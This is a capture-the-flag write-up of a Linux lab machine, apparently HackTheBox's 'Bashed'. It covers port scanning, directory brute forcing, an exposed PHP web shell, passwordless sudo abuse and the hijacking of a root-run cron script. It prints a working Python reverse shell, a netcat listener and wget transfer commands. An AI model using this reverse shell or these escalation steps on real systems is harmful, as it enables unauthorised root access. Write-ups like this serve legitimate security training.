## Bashed Room - Linux 

2 Main objectives: Get User Flag and get Root Flag

## User Flag

It is the way more easier objective. Let's see how it's done.

Step 1: 
I did an Nmap analysis of existing open ports -> Only one port open: `/80`
With that information i knew HTTP requests are possible on the target Machine which i directly went to the browser and searched for `TARGET_IP_ADDRESS:80`

Step 2: 
I dont have access to anything right now. Unfortunately the website is vulnerable against directory brute force scans so i used the command
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u TARGET_IP_ADDRESS` 
After getting the results:

<img width="837" height="157" alt="image" src="https://github.com/user-attachments/assets/1f97796c-7a83-45dd-bb39-d8f8949e987a" />

I checked every directory individualy and on `/dev` i found a file named `phpbash.php` which was a Web shell

Step 3:
After connecting with the web shell (`http://TARGET_IP/dev/phpbash.php`) and executing some basic commands to gather some information (`whoami`, `ip a`) i just went to the root of the directories and searched for directory `home` in where 2 directories got listed.
Directory: `arrexel`
Directory: `scriptmanager`
Examin both directories only `arrexel` had a file in it which contained the **User Flag** 


## Root Flag

Step 1: Identifying the weakness in the system 
After i executed the command `ls -al` in the root directory i examed every permission rights of every directory visible. Every directory was owned by root user except for Scripts directory
I also executed `sudo -l` 

<img width="951" height="120" alt="image" src="https://github.com/user-attachments/assets/61163339-47b5-47e9-ab7b-786d844de315" />

Here i can see that scriptmanager can be used as sudo user and it does not need a password. So basically i can execute every sudo command with the user `scriptmanager` without a password granting me the 
possibility to change the permissions to the scripts directory with `sudo -u scriptmanager chmod 777 scripts`
After changing the Permissions i could directly access the directory and there are only 2 files in it
File1: `test.py`
File2: `test.txt`
I can see that `test.py` is owned by scriptmanager and `test.txt` is owned by root. In some walkthroughs there is being told it is obvious that `test.txt` is a Cron job runned from root as the modification date is getting updated every minute.
On my Webshell however it is not the case. Even examing the metadatas of the file it does not show me different stats.

<img width="580" height="557" alt="image" src="https://github.com/user-attachments/assets/4b1635ac-80ce-4f85-b050-cf436bb2f063" />

Still with the information when i print `test.py` i can see that the script is getting executed and the result is written into the `test.txt` 

So a short summary:
1) I can sudo command without passwords as scriptmanager
2) `test.py` owned by scriptmanager is a python script being executed continuously and is writing into `test.txt` which is owned by root user

With these both informations i can try to upload a reverse Python shell into `test.py` which would then connect the webshell to my bash granting me root shell

To do so i just start by listening to a random port in my shell:

`nc -lvnp 1234` 

Afterwards i can use the command `wget IP_ADDRESS_MY_MACHINE:1234` in the web shell to establish a TCP connection to my netcat.
With that being done i can just type in my Python script in the netcat session and as soon as i stop the connection, the wget stores the given content as a file

Here is my Python reverse Shell:

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("TARGET_IP",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

 Since i dont have rights to write simply anywhere on the server i go to the `/tmp` directory where i can write files.
As soon as the file got uploaded in the `/tmp` directory i navigate back to the scripts directory and use the command `sudo -u scriptmanager cp /tmp/test.py test.py` which copys the content of the reverse shell script to the 
automatically executed python script.

Starting a netcat listener on given port `1234` and waiting for a few seconds the webshell will execute the new `test.py` automatically and connects as root user to the bash

With the new privileged access i can access the root directory and find the **Root Flag**


Learnings:
- NOPASSWD: ALL is a critical misconfiguration since every user can get sudo access without password
- Cron Jobs runned as root but being executed from lower priviledged users scripts is also critical



Final conclusion:
It took me really long to successfully gather the Root Flag. Basically the biggest issue for me was understanding how i get advanced access rights as root user, how i can see the Cron Job, how to import the reverse shell and how to overwrite the test.py file
